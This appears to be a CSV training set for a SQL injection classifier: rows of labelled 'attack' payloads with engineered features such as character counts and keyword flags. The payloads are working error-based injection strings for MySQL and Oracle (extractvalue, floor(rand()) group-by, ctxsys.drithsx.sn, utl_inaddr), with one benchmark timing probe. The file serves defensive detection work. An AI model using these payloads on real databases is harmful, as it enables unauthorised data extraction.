id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001067,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,3.0402217436789205,235.44974172608391,32.033505515944064,3.780549812623321,75.20103309566439,41.13402206377626,91.21520311447546,27.899483452167807,0.31956818970342726,0.17481919263676782,0.3871944348069222,0.1184181828528827,1.0335055159440647,1.9329889681118704,0.0,0.0,0.0,2.0,0.0,15.932988968111871,0.9664944840559352,0.0,5.0,3.0335055159440643,0.5167527579720324,0.48324724202796776,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.5167527579720324,0.0,0.5167527579720324,0.0,0.48324724202796765,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.516752757972032
SMOTE_001068,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000005,0.7632985410714114,218.17450746370292,39.369607675978784,3.829960523767047,65.03284221788329,38.47843070391512,90.47843070391512,24.18480383798939,0.29785910471228755,0.17611378574750966,0.4150034982499437,0.11102361129025909,0.81519616201061,0.18480383798939015,1.0,0.0,1.0,1.1848038379893902,0.0,16.0,0.0,0.0,3.0,3.1848038379893895,0.8151961620106098,0.18480383798939023,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.1848038379893902,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.18480383798939
SMOTE_001069,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,1.0214718602240223,215.16168947882687,38.0,3.756331833431134,63.0,37.0,91.10779298588457,24.053896492942286,0.2928599091837006,0.17199708952058607,0.4233915040114233,0.11175149728429001,0.5269482464711437,0.0,1.0,0.0,1.0,1.0,0.0,16.526948246471143,0.0,0.0,3.0,3.0,0.5269482464711437,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_001070,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,0.8818612478525711,335.1952062302774,33.182933852523114,3.4910344147443095,83.3781400828005,49.73173541009246,144.9023968848613,57.18293385252312,0.24858866643095356,0.14833183432369063,0.4324672329115056,0.17061226633385024,1.0,0.0,0.36586770504623006,0.0,0.0,2.182933852523115,0.0,30.451198442430655,0.0,0.5488015575693451,0.817066147476885,22.548801557569345,1.0,0.0,0.182933852523115,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.182933852523115,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.1829338525231154
SMOTE_001071,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000012,2.255218407609402,329.6185995281025,39.69070023594876,3.931399467957175,104.76280094379504,57.76280094379505,128.16509834835867,38.92789929215372,0.31790783152276675,0.1753140251332772,0.38872450101230716,0.11805364233164886,2.618599528102477,0.34535011797438075,0.6907002359487616,0.0,2.0,2.0,0.0,22.96394964607686,1.3092997640512383,0.0,6.0,5.6907002359487615,0.6546498820256192,0.3453501179743808,0.34535011797438075,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.3453501179743808,1.0,1.6546498820256192,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001072,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,1.0683064350588012,349.37254153288717,34.41830564474188,3.583361686820381,88.71898669082222,55.117624598661536,146.3267774210325,59.20915282237094,0.2539942920540097,0.15772691430347444,0.41879980198018996,0.16947899166232594,0.0,1.6274584671128212,1.7908471776290598,0.0,0.0,3.0,0.0,29.58169435525812,0.0,0.6274584671128212,0.7908471776290598,24.79084717762906,0.0,1.0,0.7908471776290595,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.7908471776290598,1.0,1.0,0.20915282237094035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001073,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,2.07166145562497,286.69366399437877,38.53873279887575,4.005137203042252,107.36531680028106,40.077465597751505,104.61619839662725,34.634683199718935,0.37498362743785824,0.13949236970530632,0.36463519729407035,0.12088880556276517,2.095950400843186,0.0,1.269366399437876,0.0,2.0,2.0,0.0,19.269366399437878,0.0,2.0,5.0,5.269366399437876,1.0,0.0,0.6346831997189382,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.6346831997189382,2.0,0.7306336005621239,0.6346831997189379,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001074,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,1.459562707298078,266.98266171380897,36.70520242014937,4.016500499624596,99.99422057126965,37.820809680597485,95.69942299141903,33.4682084705228,0.3748619909122905,0.14153933668655233,0.3583360031102321,0.12526266929092503,2.0578036302240568,0.0,0.0,0.0,2.0,1.3526012100746856,0.0,18.70520242014937,0.0,2.0,5.6473987899253135,4.057803630224056,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.3526012100746856,0.0,0.35260121007468564,2.0,0.0,0.3526012100746856,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.057803630224058
SMOTE_001075,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,3.381974227242629,288.24275254268076,32.450266581396626,3.5869247780583358,76.25133290698312,42.801066325586504,123.20426530234602,45.98608800776513,0.26878517884526,0.149707481456555,0.42655565342273966,0.15495168627544542,0.0,4.0,0.0,0.0,0.0,2.483422193798875,0.0,23.801066325586504,1.9999999999999996,0.0,3.066311224804499,12.151866069776382,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.5165778062011247,0.4834221937988754,1.0,0.0,0.0,0.4834221937988753,1.4834221937988752,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5165778062011247,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.483422193798875
SMOTE_001076,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,3.631601887954154,250.6510555957433,38.64168895318925,4.162376242271511,111.83140043402744,24.103033068094337,85.03746657021613,29.679155523405374,0.4452585061833628,0.09674711899731958,0.3395058221541704,0.11848855266514714,1.6604222382973128,0.0,0.0,0.0,1.3395777617026872,1.990633357445969,0.0,15.358311046810748,0.0,3.6510555957432818,4.348944404256718,3.3302111191486556,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.6697888808513436,0.0,2.6697888808513435,0.0,0.6604222382973128,2.0,0.6604222382973127,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6697888808513435,0.0,0.0,0.0,0.0,0.0,0.6697888808513436,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6697888808513435,0.0,0.0,0.0,8.0
SMOTE_001077,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,0.5737239678204997,213.89331208050683,31.391464966440545,3.9486335098131553,77.78292993288109,38.565859865762185,74.15305731542301,23.391464966440545,0.36406263701331376,0.1800231498173137,0.34649471453659914,0.10941949863277342,3.6085350335594533,0.0,0.0,0.0,0.0,2.0,0.0,12.391464966440546,0.0,0.0,5.0,2.391464966440547,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.1957324832202736,0.0,0.1957324832202735,0.0,0.8042675167797265,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.195732483220274
SMOTE_001078,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,0.1122677429729992,275.2278487346797,36.03410690929666,4.0274476205120635,108.01705345464833,35.34106909296659,97.75035200452649,34.11937418253831,0.3928111153878342,0.12826967454705557,0.3549269558454952,0.12399225421961506,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.136427637186635,0.0,1.965893090703341,5.017053454648329,4.017053454648329,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0511603639449882,0.05116036394498824,0.0,1.9829465453516706,1.9829465453516706,0.01705345464832947,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9829465453516704,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.068213818593318
SMOTE_001079,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,3.2224876795284607,275.46604370236093,36.0,3.8897558054118706,96.99615589083331,35.0,106.97693534499987,36.49295246652774,0.3543476516502509,0.1282439489137659,0.3856323175003969,0.1317760819355863,0.5006406848611149,1.9974372605555406,0.0,0.0,2.0,1.4993593151388853,0.0,20.99615589083331,0.9987186302777704,2.0,5.500640684861114,3.4993593151388858,0.5006406848611148,0.4993593151388853,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.9987186302777704,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.99871863027777
SMOTE_001080,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000029,0.680773090915369,343.8927152933262,34.0,3.5388953389456943,84.25506151237893,50.0202460495157,148.0,61.61740773143161,0.24500206592341994,0.14540775798093208,0.4303863235034379,0.17920385259221006,0.0,3.617407731431613,0.25506151237892416,0.0,0.0,3.0,0.0,30.0,1.7449384876210758,0.0,1.0,23.255061512378923,0.0,1.0,0.12753075618946208,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.12753075618946208,1.0,1.8724692438105377,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001081,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,1.7443815615792464,308.86267711185513,38.0,4.056808237075874,112.36348878643925,51.18093271863549,110.04523317965887,35.273022427121504,0.363879547140744,0.16541197763344917,0.356340796867064,0.1143676783587429,4.0,0.0,0.0,0.0,2.0,1.3182556067803761,0.0,20.0,0.0,0.6365112135607522,5.681744393219624,4.636511213560752,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.363488786439248,2.045233179658872,0.3182556067803761,1.3182556067803761,0.6817443932196239,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.31825560678037607,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.045233179658872
SMOTE_001082,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000021,0.06310092169480967,301.47122526924863,36.02115098923005,3.7702484407088153,99.97884901076995,35.0,124.57698021539892,41.91539604307978,0.3316815678189646,0.11611527381328204,0.4131702592391804,0.13903289912857306,0.0,4.0,0.0,0.0,2.0,2.0,0.0,23.915396043079785,1.9999999999999996,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.9788490107699457,0.021150989230053985,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001083,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000029,1.380433629149476,322.08404555827303,33.40803902523414,3.5567400918158705,81.04019512617072,46.63215610093657,138.52862440374628,55.88306992741946,0.2540223038390673,0.14547380780487218,0.4296032700773833,0.17090061827867722,0.0,4.0,0.0,0.0,0.0,2.802679675078047,0.0,27.632156100936566,1.9999999999999996,0.0,1.7892812996878111,18.856273176638993,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.19732032492195273,0.8026796750780475,1.0,0.0,0.0,0.8026796750780473,1.8026796750780472,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.19732032492195273,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.802679675078047
SMOTE_001084,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,1.0069280843970232,290.4487658453433,39.28975316906866,3.997612117636938,107.17756170773283,41.57950633813733,106.869259507206,34.822438292267165,0.3693106062443731,0.1429698338058321,0.3677770348326151,0.11994252511717973,1.532685123198502,0.0,1.644876584534332,0.0,2.0,2.0,0.0,19.644876584534334,0.0,2.0,5.0,5.644876584534332,1.0,0.0,0.822438292267166,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.8224382922671661,2.0,0.35512341546566806,0.822438292267166,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001085,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000003,1.2742583992231244,346.68614732865353,34.0,3.615623156308698,91.30216427415439,54.348917862922804,142.6978357258456,58.3372294657307,0.26344305445705873,0.15673714993200605,0.41155025009859414,0.1682695455123411,0.6627705342692998,0.3372294657307003,2.0,0.0,0.0,3.0,0.0,28.674458931461402,0.0,1.9883116028078993,0.33722946573070045,25.0,0.6627705342692998,0.33722946573070023,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001086,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,1.5574444348117735,333.90756448725176,33.45378224362589,3.4646202653902174,80.5462177563741,50.36134673087767,146.0,57.0,0.2412296875030719,0.1508122253731964,0.43725064394120605,0.17070744318252565,0.5462177563741109,0.0,0.4537822436258895,0.0,0.0,2.0,0.0,31.0,0.0,0.0,1.0,22.453782243625888,0.5462177563741106,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.5462177563741106,0.4537822436258893,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001087,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000012,1.7414076634298052,329.93332665257117,39.53333667371443,3.916851978061786,104.1333466948577,57.13334669485771,129.26664328399903,39.39998997885672,0.3156863035508712,0.17322916184028095,0.39170640799552564,0.11937812661332223,2.9333266525711474,0.26666833685721325,0.5333366737144265,0.0,2.0,2.0,0.0,23.19999498942836,1.4666633262855733,0.0,6.0,5.533336673714427,0.7333316631427867,0.2666683368572133,0.2666683368572133,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.2666683368572133,1.0,1.7333316631427866,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001088,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,1.9815234379354942,198.80207641087728,31.0,3.6554276745270697,64.93639110754013,26.434616879604356,82.1201208731766,25.31094755055619,0.3282829540336771,0.1318971213249783,0.4126640241140379,0.12715590052730671,3.250887113967891,0.7491128860321088,0.0,0.0,0.0,0.3745564430160546,0.0,16.374556443016054,0.37455644301605434,0.0,4.187278221508027,0.37455644301605595,0.8127217784919728,0.1872782215080272,0.0,0.0,0.0,0.1872782215080272,1.0,0.0,0.0,1.0,0.0,0.1872782215080271,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8127217784919728,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1872782215080272,0.1872782215080272,3.374556443016054
SMOTE_001089,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,1.7941843716265435,343.32197898984185,34.74200233446202,3.5944034884825924,88.22600700338606,53.66098949492092,143.17698482599687,58.257997665537985,0.25736155127417143,0.1560756757383936,0.41683555764718,0.16972721534025495,0.0,0.6289988327689908,2.3710011672310096,0.0,0.0,2.628998832768991,0.0,29.25799766553798,0.0,1.113003501693028,0.6289988327689908,25.0,0.0,0.6289988327689906,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.6289988327689907,1.0,0.6289988327689907,0.37100116723100923,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.628998832768991
SMOTE_001090,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000019,1.1528698265482982,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,3.016194225321251,0.9838057746787493,0.0,0.0,0.0,3.0,0.0,30.0,1.9999999999999996,0.0,1.0,23.0,0.7540485563303126,0.24595144366968746,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
